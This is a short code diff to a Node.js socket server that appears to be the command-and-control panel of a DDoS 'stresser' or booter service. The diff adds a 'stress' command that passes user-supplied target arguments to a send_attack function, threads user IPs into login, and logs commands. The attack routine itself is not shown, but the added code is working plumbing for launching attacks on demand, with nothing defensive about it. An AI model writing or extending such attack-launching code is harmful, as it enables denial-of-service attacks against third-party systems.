@@ -56,7 +56,7 @@ Server.svr.on('connection', async function(socket) {
     /* Get User Input In A Loop */
 
     socket.write(Config.Colors.Clear);
-    let login_resp = Auth.login(username, password);
+    let login_resp = Auth.login(username, password, Server.Socket_Info.UserIP);
     console.log(login_resp)
     if(login_resp.includes("Successfully")) {
         socket.write(Banners.main_b());
@@ -79,7 +79,6 @@ Server.svr.on('connection', async function(socket) {
 
     while(true) {
         let Current = Crud.GetCurrentUser(Server.Socket_Info.UserIP).split(",");
-        console.log(Current);
         let inputCMD = await ServerFunc.getInput(socket, Config.hostname(username))
         eConfig.GetCmd(inputCMD);
         // eConfig.GetUserInfo();
@@ -98,6 +97,9 @@ Server.svr.on('connection', async function(socket) {
             socket.write(result);
         } else if(eConfig.CurrentCmd.Cmd === "myinfo") {
             socket.write(eCrud.show_stats(Current[0]))
+        } else if(eConfig.CurrentCmd.Cmd === "stress") {
+            console.log(eConfig.CurrentCmd.arg);
+            socket.write(await eExtra.send_attack(eConfig.CurrentCmd.arg[1], eConfig.CurrentCmd.arg[2], eConfig.CurrentCmd.arg[3], eConfig.CurrentCmd.arg[4]));
         } else if(eConfig.CurrentCmd.Cmd === "admin") {
             if(C.CurrentCmd.arg.length === 1) {
                 let tool = C.CurrentCmd.arg[1];
@@ -110,6 +112,9 @@ Server.svr.on('connection', async function(socket) {
                 }
             }
         }
+
+        
+        eExtra.log_action("CMD", username, Server.Socket_Info.UserIP + ":" + Server.Socket_Info.UserPORT);
 
         //* END
         
